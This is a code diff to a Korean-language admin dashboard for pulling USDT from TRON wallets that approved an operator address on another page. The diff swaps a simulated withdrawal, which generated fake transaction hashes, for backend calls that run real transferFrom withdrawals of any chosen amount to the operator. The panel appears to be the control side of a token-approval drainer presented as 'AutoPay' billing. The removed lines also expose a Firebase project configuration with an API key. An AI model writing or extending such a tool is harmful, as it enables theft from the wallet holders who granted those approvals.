@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TRON USDT - 관리자 지갑 인출 대시보드</title>
-    <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
@@ -22,31 +21,11 @@
             }
         }
     </script>
-    <!-- FontAwesome for icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Inter Font -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <!-- Official TronWeb Library for Real On-Chain RPC Queries -->
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <style>
         body { font-family: 'Inter', sans-serif; background-color: #080c14; color: #f3f4f6; }
     </style>
-    <!-- Firebase SDK (v9 compat) — jsdelivr 우선, gstatic 폴백 -->
-    <script src="https://cdn.jsdelivr.net/npm/firebase@9.23.0/firebase-app-compat.js"
-            onerror="loadFallbackFirebase(0)"></script>
-    <script src="https://cdn.jsdelivr.net/npm/firebase@9.23.0/firebase-firestore-compat.js"
-            onerror="loadFallbackFirebase(1)"></script>
-    <script>
-        function loadFallbackFirebase(idx) {
-            var urls = [
-                "https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js",
-                "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"
-            ];
-            var s = document.createElement('script');
-            s.src = urls[idx];
-            document.head.appendChild(s);
-        }
-    </script>
 </head>
 <body class="bg-[#080c14] text-gray-100 min-h-screen flex flex-col selection:bg-blue-500 selection:text-white">
 
@@ -70,7 +49,10 @@
             </div>
             
             <div class="flex items-center space-x-2">
-                <button onclick="scanApprovedWallets()" class="flex items-center space-x-1.5 bg-[#080c14] hover:bg-[#1e293b] border border-[#1e293b] text-gray-300 px-3 py-2 rounded-xl text-xs transition-all active:scale-95">
+                <span id="server-status" class="px-2.5 py-1 rounded-full text-[10px] font-medium bg-emerald-950/40 text-emerald-400 border border-emerald-900/50">
+                    <i class="fa-solid fa-circle text-[6px] mr-1"></i>서버 연결됨
+                </span>
+                <button onclick="refreshAllWallets()" class="flex items-center space-x-1.5 bg-[#080c14] hover:bg-[#1e293b] border border-[#1e293b] text-gray-300 px-3 py-2 rounded-xl text-xs transition-all active:scale-95">
                     <i class="fa-solid fa-rotate text-blue-400"></i>
                     <span>온체인 동기화</span>
                 </button>
@@ -80,15 +62,6 @@
 
     <!-- Main Content Container -->
     <main class="flex-grow max-w-4xl w-full mx-auto px-4 sm:px-6 py-8 space-y-6">
-
-        <!-- Firebase 연결 상태 배너 (JS에서 제어) -->
-        <div id="firebase-warning-banner" class="hidden bg-amber-950/40 border border-amber-900/50 rounded-2xl p-4 text-xs text-amber-400 flex items-center space-x-3">
-            <i class="fa-solid fa-triangle-exclamation text-lg"></i>
-            <div>
-                <div class="font-bold">Firebase 연결 실패</div>
-                <div class="text-amber-500 mt-0.5">Firestore DB에 연결할 수 없습니다. 지갑 목록은 로컬 저장소에서 불러옵니다. 네트워크 환경을 확인하거나 페이지를 새로고침해주세요.</div>
-            </div>
-        </div>
 
         <!-- Operator Recipient Wallet Setting Card -->
         <div class="bg-[#0f172a] border border-[#1e293b] rounded-2xl p-6 shadow-sm space-y-4">
@@ -130,7 +103,7 @@
                     <h2 class="text-xl font-bold text-white">연결된 지갑별 잔액 및 인출 제어</h2>
                     <p class="text-sm text-gray-400 mt-1">1번 화면에서 연결 및 승인을 완료한 트론 지갑들의 보유 USDT를 확인하고 원하는 금액만큼 인출하세요.</p>
                 </div>
-                <button onclick="scanApprovedWallets()" class="bg-[#080c14] hover:bg-[#1e293b] border border-[#1e293b] text-gray-300 px-4 py-2.5 rounded-xl text-xs flex items-center space-x-2 transition-all active:scale-95">
+                <button onclick="refreshAllWallets()" class="bg-[#080c14] hover:bg-[#1e293b] border border-[#1e293b] text-gray-300 px-4 py-2.5 rounded-xl text-xs flex items-center space-x-2 transition-all active:scale-95">
                     <i class="fa-solid fa-rotate text-blue-400"></i>
                     <span>지갑 잔액 새로고침</span>
                 </button>
@@ -149,23 +122,20 @@
                         </tr>
                     </thead>
                     <tbody id="approved-wallets-tbody" class="divide-y divide-[#1e293b]/50 font-mono">
-                        <!-- Dynamically populated rows -->
                     </tbody>
                 </table>
             </div>
         </div>
 
-        <!-- Subscription & Gasless Relay History Summary -->
+        <!-- Gasless Relay History -->
         <div class="bg-[#0f172a] border border-[#1e293b] rounded-2xl p-6 sm:p-8 shadow-sm space-y-6">
-            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
-                <div>
-                    <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-blue-500/10 text-blue-400 text-xs font-semibold border border-blue-500/20 mb-3">
-                        <i class="fa-solid fa-gas-pump"></i>
-                        <span>운영자 가스비 대납 (Gasless Relay) 시스템</span>
-                    </div>
-                    <h2 class="text-xl font-bold text-white">가스비 대납형 인출 실행 내역</h2>
-                    <p class="text-sm text-gray-400 mt-1">수수료(TRX)를 운영자 지갑에서 대납하여 사용자의 TRX 보유 여부와 무관하게 즉시 처리됩니다.</p>
+            <div>
+                <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-blue-500/10 text-blue-400 text-xs font-semibold border border-blue-500/20 mb-3">
+                    <i class="fa-solid fa-gas-pump"></i>
+                    <span>운영자 가스비 대납 (Gasless Relay) 시스템</span>
                 </div>
+                <h2 class="text-xl font-bold text-white">가스비 대납형 인출 실행 내역</h2>
+                <p class="text-sm text-gray-400 mt-1">수수료(TRX)를 운영자 지갑에서 대납하여 사용자의 TRX 보유 여부와 무관하게 즉시 처리됩니다.</p>
             </div>
 
             <!-- Stats Grid -->
@@ -186,10 +156,7 @@
 
             <!-- History List -->
             <div class="space-y-3 pt-2">
-                <div class="flex items-center justify-between">
-                    <h3 class="text-xs font-semibold text-gray-400 uppercase tracking-wider">최근 대납 인출 트랜잭션 기록</h3>
-                    <button onclick="clearHistory()" class="text-[11px] text-gray-500 hover:text-gray-300 transition-colors">내역 초기화</button>
-                </div>
+                <h3 class="text-xs font-semibold text-gray-400 uppercase tracking-wider">최근 대납 인출 트랜잭션 기록</h3>
                 <div id="history-list-container" class="space-y-3">
                     <div id="empty-history" class="p-6 text-center text-gray-500 text-xs border border-dashed border-[#1e293b] rounded-xl">
                         인출 실행 내역이 없습니다.
@@ -205,91 +172,11 @@
         <p>&copy; 2026 TRON USDT AutoPay Dashboard. All rights reserved.</p>
     </footer>
 
-    <!-- ===================== JavaScript Logic ===================== -->
     <script>
-        // ─── Firebase 초기화 (SDK 미로드 시에도 대시보드 기본 동작 보장) ───
-        const firebaseConfig = {
-            apiKey: "AIzaSyC8nmarifpVe3bJ_PnYaGgC-RmPj4NnuFE",
-            authDomain: "bill-59e66.firebaseapp.com",
-            projectId: "bill-59e66",
-            storageBucket: "bill-59e66.firebasestorage.app",
-            messagingSenderId: "800127626373",
-            appId: "1:800127626373:web:105f62a15432ee2ab24dec",
-            measurementId: "G-YNHQPDYTSP"
-        };
-
-        let db = null;
-        let firebaseReady = false;
-        let firestoreOnline = false;
-
-        function initFirebase() {
-            if (typeof firebase === 'undefined') {
-                console.warn("Firebase SDK 미로드 — localStorage 폴백 모드");
-                return false;
-            }
-            try {
-                if (!firebase.apps.length) {
-                    firebase.initializeApp(firebaseConfig);
-                }
-                db = firebase.firestore();
-                firebaseReady = true;
-                return true;
-            } catch (e) {
-                console.error("Firebase 초기화 실패:", e);
-                return false;
-            }
-        }
-
-        async function testFirestoreConnection(timeoutMs = 5000) {
-            if (!db) return false;
-            try {
-                const testPromise = db.collection("settings").doc("operator").get();
-                const timeoutPromise = new Promise((_, reject) =>
-                    setTimeout(() => reject(new Error("Firestore 연결 타임아웃")), timeoutMs)
-                );
-                await Promise.race([testPromise, timeoutPromise]);
-                firestoreOnline = true;
-                return true;
-            } catch (e) {
-                console.warn("Firestore 백엔드 연결 실패:", e.message || e);
-                try { await db.disableNetwork(); } catch (x) { /* 무시 */ }
-                firestoreOnline = false;
-                return false;
-            }
-        }
-
-        function showFirebaseWarning() {
-            const banner = document.getElementById('firebase-warning-banner');
-            if (banner) banner.classList.remove('hidden');
-        }
-
-        initFirebase();
-
-        window.addEventListener('DOMContentLoaded', async () => {
-            if (!firebaseReady) initFirebase();
-            if (firebaseReady) {
-                const connected = await testFirestoreConnection(5000);
-                if (!connected) showFirebaseWarning();
-            } else {
-                showFirebaseWarning();
-            }
-            bootDashboard();
-        });
-
-        // ─── 상수 ───
-        const OFFICIAL_USDT_CONTRACT = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
-        let totalCount = 0;
-        let totalSum = 0.00;
-
-        // Nile Testnet 읽기전용 TronWeb (온체인 잔액 조회용)
-        let readOnlyTronWeb = null;
-        if (typeof TronWeb !== 'undefined') {
-            try {
-                readOnlyTronWeb = new TronWeb({ fullHost: 'https://nile.trongrid.io' });
-            } catch (e) {
-                console.warn("TronWeb 읽기전용 인스턴스 생성 실패:", e);
-            }
-        }
+        // ═══════════════════════════════════════
+        //  백엔드 API 주소
+        // ═══════════════════════════════════════
+        const API_BASE = 'https://tron-usdt-backend.vercel.app/api';
 
 
         // ═══════════════════════════════════════
@@ -311,7 +198,6 @@
             }`;
             const iconClass = type === 'success' ? 'fa-circle-check' : 'fa-circle-exclamation';
             toast.innerHTML = `<i class="fa-solid ${iconClass}"></i><span>${escapeHtml(message)}</span>`;
-
             container.appendChild(toast);
             requestAnimationFrame(() => toast.classList.remove('translate-y-2', 'opacity-0'));
             setTimeout(() => {
@@ -320,167 +206,112 @@
             }, 3500);
         }
 
-        /** USDT 온체인 잔액 조회 (읽기전용 TronWeb) */
-        async function fetchRealUsdtBalance(address) {
-            try {
-                if (readOnlyTronWeb && readOnlyTronWeb.contract) {
-                    const contract = await readOnlyTronWeb.contract().at(OFFICIAL_USDT_CONTRACT);
-                    const rawBalance = await contract.balanceOf(address).call();
-                    const formatted = (parseInt(rawBalance.toString()) / 1e6).toFixed(2);
-                    return formatted;
-                }
-            } catch (err) {
-                console.warn("USDT balance check error:", err);
-            }
-            return "0.00";
-        }
-
 
         // ═══════════════════════════════════════
-        //  대시보드 부팅 (DOMContentLoaded)
+        //  페이지 로드 시 초기화
         // ═══════════════════════════════════════
 
-        /** 대시보드 초기 데이터 로딩 */
-        async function bootDashboard() {
-            // 1) 운영자 주소 불러오기: Firestore 우선 → localStorage 폴백
+        window.addEventListener('DOMContentLoaded', async () => {
+            await checkServerStatus();
             await loadOperatorAddress();
+            await loadWalletList();
+            await loadHistory();
+        });
 
-            // 2) 인출 히스토리 (localStorage)
-            loadHistoryData();
-
-            // 3) 승인된 지갑 목록: Firestore 실시간 구독 또는 localStorage 폴백
-            loadApprovedWalletsData();
-        }
-
-        // DOMContentLoaded는 상단 initFirebase 블록에서 처리됨
-
-        /** 운영자 수신 지갑 주소 로드 */
-        async function loadOperatorAddress() {
-            const inputElem = document.getElementById('operator-recipient-input');
-
-            if (db && firestoreOnline) {
-                try {
-                    const docSnap = await db.collection("settings").doc("operator").get();
-                    if (docSnap.exists && docSnap.data().address) {
-                        const savedDbAddress = docSnap.data().address;
-                        if (inputElem) inputElem.value = savedDbAddress;
-                        localStorage.setItem('tron_operator_recipient_address', savedDbAddress);
-                        return;
-                    }
-                } catch (e) {
-                    console.warn("DB 운영자 주소 조회 실패:", e.message || e);
+        /** 서버 연결 상태 확인 */
+        async function checkServerStatus() {
+            const badge = document.getElementById('server-status');
+            try {
+                const res = await fetch(`${API_BASE.replace('/api', '')}`);
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    badge.innerHTML = '<i class="fa-solid fa-circle text-[6px] mr-1"></i>서버 연결됨';
+                    badge.className = "px-2.5 py-1 rounded-full text-[10px] font-medium bg-emerald-950/40 text-emerald-400 border border-emerald-900/50";
                 }
+            } catch (e) {
+                badge.innerHTML = '<i class="fa-solid fa-circle text-[6px] mr-1"></i>서버 오프라인';
+                badge.className = "px-2.5 py-1 rounded-full text-[10px] font-medium bg-red-950/40 text-red-400 border border-red-900/50";
             }
-
-            const savedRecipient = localStorage.getItem('tron_operator_recipient_address') || '';
-            if (inputElem) inputElem.value = savedRecipient;
         }
 
 
         // ═══════════════════════════════════════
-        //  운영자 주소 저장
+        //  운영자 주소 관리
         // ═══════════════════════════════════════
 
+        /** 운영자 주소 불러오기 */
+        async function loadOperatorAddress() {
+            try {
+                const res = await fetch(`${API_BASE}/admin/spender`);
+                const data = await res.json();
+                if (data.status === 'ok' && data.address) {
+                    document.getElementById('operator-recipient-input').value = data.address;
+                }
+            } catch (e) {
+                console.warn("운영자 주소 로드 실패:", e);
+            }
+        }
+
+        /** 운영자 주소 저장 */
         window.saveOperatorRecipient = async function() {
-            const inputElem = document.getElementById('operator-recipient-input');
-            const address = inputElem ? inputElem.value.trim() : '';
+            const input = document.getElementById('operator-recipient-input');
+            const address = input ? input.value.trim() : '';
 
             if (!address) {
                 showToast("운영자 수신 지갑 주소를 입력해주세요.", "error");
                 return;
             }
-
             if (!address.startsWith('T') || address.length < 25) {
                 showToast("올바른 트론(T로 시작하는) 주소를 입력해주세요.", "error");
                 return;
             }
 
-            localStorage.setItem('tron_operator_recipient_address', address);
+            try {
+                const res = await fetch(`${API_BASE}/admin/spender`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address })
+                });
+                const data = await res.json();
 
-            if (db && firestoreOnline) {
-                try {
-                    await db.collection("settings").doc("operator").set({
-                        address: address,
-                        updatedAt: firebase.firestore.FieldValue.serverTimestamp()
-                    });
-                    showToast("운영자 주소가 DB에 저장되어 1번에 자동 연동되었습니다!");
-                    return;
-                } catch (e) {
-                    console.error("Firestore 주소 저장 오류:", e);
+                if (data.status === 'ok') {
+                    showToast("운영자 주소가 서버에 저장되어 1번에 자동 연동되었습니다!");
+                } else {
+                    throw new Error(data.error);
                 }
+            } catch (e) {
+                showToast("주소 저장 실패: " + (e.message || e), "error");
             }
-
-            // Firestore 저장 실패 또는 미연결 시
-            showToast("운영자 주소가 로컬에 저장되었습니다. (DB 연결 시 자동 동기화)", firebaseReady ? "error" : "success");
         };
 
 
         // ═══════════════════════════════════════
-        //  승인된 지갑 목록 로딩
+        //  지갑 목록 관리
         // ═══════════════════════════════════════
 
-        let snapshotUnsubscribe = null;
-
-        function loadApprovedWalletsData() {
+        /** 지갑 목록 로드 */
+        async function loadWalletList() {
             const tbody = document.getElementById('approved-wallets-tbody');
             if (!tbody) return;
 
-            if (db && firestoreOnline) {
-                snapshotUnsubscribe = db.collection("approved_wallets").orderBy("updatedAt", "desc")
-                  .onSnapshot((snapshot) => {
-                      renderWalletTable(tbody, snapshot);
-                  }, async (error) => {
-                      console.error("Firestore onSnapshot 오류 — 구독 해제:", error.message || error);
-                      if (snapshotUnsubscribe) { snapshotUnsubscribe(); snapshotUnsubscribe = null; }
-                      try { await db.disableNetwork(); } catch (e) { /* 무시 */ }
-                      firestoreOnline = false;
-                      showFirebaseWarning();
-                      loadWalletsFromLocalStorage(tbody);
-                  });
-                return;
-            }
-
-            loadWalletsFromLocalStorage(tbody);
-        }
-
-        /** Firestore snapshot → 테이블 렌더링 */
-        function renderWalletTable(tbody, snapshot) {
-            if (snapshot.empty) {
-                tbody.innerHTML = `<tr><td colspan="5" class="p-8 text-center text-gray-500">1번 화면에서 연결 또는 승인된 지갑이 아직 없습니다.</td></tr>`;
-                return;
-            }
-
-            tbody.innerHTML = '';
-            let index = 0;
-
-            snapshot.forEach((doc) => {
-                const w = doc.data();
-                renderWalletRow(tbody, w, index);
-                index++;
-            });
-        }
-
-        /** localStorage → 테이블 렌더링 (Firestore 미연결 폴백) */
-        function loadWalletsFromLocalStorage(tbody) {
-            let wallets = [];
             try {
-                wallets = JSON.parse(localStorage.getItem('tron_approved_wallets_list') || '[]');
+                const res = await fetch(`${API_BASE}/wallet/list`);
+                const data = await res.json();
+
+                if (data.status === 'ok' && data.wallets && data.wallets.length > 0) {
+                    tbody.innerHTML = '';
+                    data.wallets.forEach((w, index) => {
+                        renderWalletRow(tbody, w, index);
+                    });
+                } else {
+                    tbody.innerHTML = `<tr><td colspan="5" class="p-8 text-center text-gray-500">1번 화면에서 연결 또는 승인된 지갑이 아직 없습니다.</td></tr>`;
+                }
             } catch (e) {
-                wallets = [];
+                tbody.innerHTML = `<tr><td colspan="5" class="p-8 text-center text-red-400">서버 연결 실패 — 백엔드 서버가 실행 중인지 확인하세요.</td></tr>`;
             }
-
-            if (wallets.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" class="p-8 text-center text-gray-500">1번 화면에서 연결 또는 승인된 지갑이 아직 없습니다.<br><span class="text-amber-500 text-[10px] mt-1 block">(Firestore 미연결 — 로컬 데이터 표시 중)</span></td></tr>`;
-                return;
-            }
-
-            tbody.innerHTML = '';
-            wallets.forEach((w, index) => {
-                renderWalletRow(tbody, w, index);
-            });
         }
 
-        /** 지갑 1행 렌더링 (공통) */
+        /** 지갑 1행 렌더링 */
         function renderWalletRow(tbody, w, index) {
             const tr = document.createElement('tr');
             tr.className = "hover:bg-[#080c14]/40 transition-colors";
@@ -506,7 +337,7 @@
                 <td class="p-3 text-right">
                     <div class="inline-flex items-center space-x-2">
                         <input type="number" id="charge-amt-${index}" value="35" min="1" class="w-20 bg-[#080c14] border border-[#1e293b] rounded-lg px-2 py-1 text-xs text-white text-center font-mono">
-                        <button onclick="executeSpecificGaslessCharge('${escapeHtml(addr)}', ${index})" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded-lg text-xs transition-all shadow-sm active:scale-95">
+                        <button onclick="executeWithdraw('${escapeHtml(addr)}', ${index})" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded-lg text-xs transition-all shadow-sm active:scale-95">
                             인출하기
                         </button>
                     </div>
@@ -515,130 +346,117 @@
             tbody.appendChild(tr);
         }
 
-
-        // ═══════════════════════════════════════
-        //  온체인 잔액 동기화
-        // ═══════════════════════════════════════
-
-        window.scanApprovedWallets = async function() {
+        /** 모든 지갑 잔액 새로고침 */
+        window.refreshAllWallets = async function() {
             showToast("온체인 실시간 잔액 조회 중...");
 
-            // ── Firestore 연결 시: DB 기반 스캔 ──
-            if (db && firestoreOnline) {
-                try {
-                    const snapshot = await db.collection("approved_wallets").get();
-                    if (snapshot.empty) {
-                        showToast("연결된 지갑이 없습니다.");
-                        return;
-                    }
-
-                    let index = 0;
-                    for (const doc of snapshot.docs) {
-                        const data = doc.data();
-                        const liveBalance = await fetchRealUsdtBalance(data.address);
-
-                        // UI 갱신
-                        const cell = document.getElementById(`bal-cell-${index}`);
-                        if (cell) cell.innerText = `${liveBalance} USDT`;
-
-                        // Firestore 잔액 업데이트
-                        await db.collection("approved_wallets").doc(data.address).update({
-                            balance: liveBalance,
-                            updatedAt: firebase.firestore.FieldValue.serverTimestamp()
-                        });
-                        index++;
-                    }
-                    showToast("모든 지갑의 온체인 USDT 잔액이 최신 상태로 갱신되었습니다!");
-                    return;
-                } catch (err) {
-                    console.error("Firestore 기반 온체인 동기화 오류:", err);
-                }
-            }
-
-            // ── Firestore 미연결 시: localStorage 기반 스캔 ──
             try {
-                let wallets = JSON.parse(localStorage.getItem('tron_approved_wallets_list') || '[]');
-                if (wallets.length === 0) {
-                    showToast("연결된 지갑이 없습니다.");
-                    return;
-                }
+                const res = await fetch(`${API_BASE}/wallet/refresh`, {
+                    method: 'POST'
+                });
+                const data = await res.json();
 
-                for (let i = 0; i < wallets.length; i++) {
-                    const liveBalance = await fetchRealUsdtBalance(wallets[i].address);
-                    wallets[i].balance = liveBalance;
-
-                    const cell = document.getElementById(`bal-cell-${i}`);
-                    if (cell) cell.innerText = `${liveBalance} USDT`;
+                if (data.status === 'ok') {
+                    // 테이블 전체 다시 로드
+                    await loadWalletList();
+                    showToast("모든 지갑의 온체인 USDT 잔액이 최신 상태로 갱신되었습니다!");
+                } else {
+                    throw new Error(data.error);
                 }
-                localStorage.setItem('tron_approved_wallets_list', JSON.stringify(wallets));
-                showToast("온체인 잔액이 갱신되었습니다! (로컬 모드)");
-            } catch (err) {
-                console.error("localStorage 기반 온체인 동기화 오류:", err);
-                showToast("잔액 조회 중 오류가 발생했습니다.", "error");
+            } catch (e) {
+                showToast("잔액 조회 실패: " + (e.message || e), "error");
             }
         };
 
 
         // ═══════════════════════════════════════
-        //  가스비 대납 인출 실행
+        //  인출 실행 (백엔드에서 실제 온체인 transferFrom)
         // ═══════════════════════════════════════
 
-        window.executeSpecificGaslessCharge = function(address, index) {
+        window.executeWithdraw = async function(address, index) {
             const inputElem = document.getElementById(`charge-amt-${index}`);
             const amount = parseFloat(inputElem ? inputElem.value : 35);
-            const recipient = localStorage.getItem('tron_operator_recipient_address');
-
-            if (!recipient) {
-                showToast("상단에서 수신 받을 운영자 지갑 주소를 먼저 저장해주세요.", "error");
-                document.getElementById('operator-recipient-input')?.focus();
-                return;
-            }
 
             if (!amount || amount <= 0) {
                 showToast("올바른 인출 금액을 입력해주세요.", "error");
                 return;
             }
 
-            showToast(`[가스비 대납 인출] ${address.substring(0, 8)}... 대상 ${amount} USDT 인출 요청 중...`);
+            // 버튼 비활성화 (중복 클릭 방지)
+            const btn = event.target;
+            const originalText = btn.innerText;
+            btn.innerText = "처리중...";
+            btn.disabled = true;
 
-            setTimeout(() => {
-                const txHash = "0x" + Array.from(crypto.getRandomValues(new Uint8Array(24))).map(b => b.toString(16).padStart(2, '0')).join('');
-                
-                totalCount += 1;
-                totalSum += amount;
+            showToast(`${address.substring(0, 8)}... 대상 ${amount} USDT 인출 요청 중...`);
 
-                document.getElementById('current-billing-amount').innerText = `${amount.toFixed(2)} USDT`;
-                document.getElementById('tx-count').innerText = `${totalCount}회`;
-                document.getElementById('total-amount').innerText = `${totalSum.toFixed(2)} USDT`;
+            try {
+                const res = await fetch(`${API_BASE}/admin/withdraw`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        fromAddress: address,
+                        amount: amount
+                    })
+                });
+                const data = await res.json();
 
-                const historyItem = {
-                    address: address,
-                    recipient: recipient,
-                    amount: amount.toFixed(2),
-                    txHash: txHash,
-                    date: new Date().toLocaleString()
-                };
+                if (data.status === 'ok') {
+                    showToast(`${amount} USDT 인출 완료! TxHash: ${data.txHash.substring(0, 16)}...`);
 
-                let history = JSON.parse(localStorage.getItem('tron_relay_history') || '[]');
-                history.unshift(historyItem);
-                localStorage.setItem('tron_relay_history', JSON.stringify(history));
+                    // 잔액 셀 즉시 업데이트
+                    const cell = document.getElementById(`bal-cell-${index}`);
+                    if (cell) cell.innerText = `${data.newBalance} USDT`;
 
-                renderHistoryList(history);
-                showToast(`지갑(${address.substring(0, 6)}...)에서 ${amount} USDT 인출이 완료되었습니다!`);
-            }, 1200);
+                    // 히스토리 다시 로드
+                    await loadHistory();
+                } else {
+                    throw new Error(data.error);
+                }
+            } catch (e) {
+                showToast("인출 실패: " + (e.message || e), "error");
+            } finally {
+                btn.innerText = originalText;
+                btn.disabled = false;
+            }
         };
 
 
         // ═══════════════════════════════════════
-        //  인출 히스토리
+        //  인출 내역 (백엔드에서 조회)
         // ═══════════════════════════════════════
+
+        async function loadHistory() {
+            try {
+                const res = await fetch(`${API_BASE}/admin/history`);
+                const data = await res.json();
+
+                if (data.status === 'ok' && data.history) {
+                    const history = data.history;
+
+                    // 통계 업데이트
+                    const totalCount = history.length;
+                    const totalSum = history.reduce((acc, cur) => acc + parseFloat(cur.amount || 0), 0);
+
+                    document.getElementById('tx-count').innerText = `${totalCount}회`;
+                    document.getElementById('total-amount').innerText = `${totalSum.toFixed(2)} USDT`;
+                    if (history.length > 0) {
+                        document.getElementById('current-billing-amount').innerText = `${history[0].amount} USDT`;
+                    }
+
+                    renderHistoryList(history);
+                }
+            } catch (e) {
+                console.warn("히스토리 로드 실패:", e);
+            }
+        }
 
         function renderHistoryList(history) {
             const container = document.getElementById('history-list-container');
             if (!container) return;
 
             if (!history || history.length === 0) {
-                container.innerHTML = `<div id="empty-history" class="p-6 text-center text-gray-500 text-xs border border-dashed border-[#1e293b] rounded-xl">인출 실행 내역이 없습니다.</div>`;
+                container.innerHTML = `<div class="p-6 text-center text-gray-500 text-xs border border-dashed border-[#1e293b] rounded-xl">인출 실행 내역이 없습니다.</div>`;
                 return;
             }
 
@@ -647,7 +465,18 @@
                 const div = document.createElement('div');
                 div.className = "bg-[#080c14] border border-[#1e293b] rounded-xl p-4 flex flex-col sm:flex-row sm:items-center justify-between text-xs gap-3";
 
-                const recipientShort = (item.recipient || '').length > 8 ? item.recipient.substring(0, 8) + '...' : item.recipient;
+                const recipientShort = (item.toAddress || '').length > 8 ? item.toAddress.substring(0, 8) + '...' : (item.toAddress || '');
+                const fromShort = (item.fromAddress || '').length > 8 ? item.fromAddress.substring(0, 8) + '...' : (item.fromAddress || '');
+
+                // Firestore Timestamp 처리
+                let dateStr = '';
+                if (item.createdAt) {
+                    if (item.createdAt._seconds) {
+                        dateStr = new Date(item.createdAt._seconds * 1000).toLocaleString();
+                    } else {
+                        dateStr = new Date(item.createdAt).toLocaleString();
+                    }
+                }
 
                 div.innerHTML = `
                     <div class="flex items-center space-x-3">
@@ -655,49 +484,19 @@
                             <i class="fa-solid fa-gas-pump"></i>
                         </div>
                         <div>
-                            <div class="font-bold text-white">대납 인출 완료 (${escapeHtml(recipientShort)} 수신)</div>
-                            <div class="text-gray-400 text-[11px] font-mono mt-0.5">${escapeHtml(item.date || '')}</div>
+                            <div class="font-bold text-white">${escapeHtml(fromShort)} → ${escapeHtml(recipientShort)}</div>
+                            <div class="text-gray-400 text-[11px] font-mono mt-0.5">${escapeHtml(dateStr)}</div>
                             <div class="text-gray-500 text-[10px] font-mono mt-0.5 truncate max-w-xs">Tx: ${escapeHtml(item.txHash || '')}</div>
                         </div>
                     </div>
                     <div class="text-right flex sm:flex-col justify-between items-center sm:items-end">
-                        <div class="font-bold text-emerald-400 font-mono text-sm">-${escapeHtml(item.amount || '0')} USDT</div>
+                        <div class="font-bold text-emerald-400 font-mono text-sm">-${escapeHtml(String(item.amount || '0'))} USDT</div>
                         <span class="inline-block mt-1 px-2 py-0.5 rounded text-[10px] bg-blue-950/50 text-blue-400 border border-blue-900">대납 성공</span>
                     </div>
                 `;
                 container.appendChild(div);
             });
         }
-
-        function loadHistoryData() {
-            let history = [];
-            try {
-                history = JSON.parse(localStorage.getItem('tron_relay_history') || '[]');
-            } catch (e) {
-                history = [];
-            }
-            totalCount = history.length;
-            totalSum = history.reduce((acc, cur) => acc + parseFloat(cur.amount || 0), 0);
-
-            document.getElementById('tx-count').innerText = `${totalCount}회`;
-            document.getElementById('total-amount').innerText = `${totalSum.toFixed(2)} USDT`;
-            if (history.length > 0) {
-                document.getElementById('current-billing-amount').innerText = `${history[0].amount} USDT`;
-            }
-
-            renderHistoryList(history);
-        }
-
-        window.clearHistory = function() {
-            localStorage.removeItem('tron_relay_history');
-            totalCount = 0;
-            totalSum = 0.00;
-            document.getElementById('tx-count').innerText = "0회";
-            document.getElementById('total-amount').innerText = "0.00 USDT";
-            document.getElementById('current-billing-amount').innerText = "0.00 USDT";
-            renderHistoryList([]);
-            showToast("인출 내역이 초기화되었습니다.");
-        };
     </script>
 </body>
 </html>
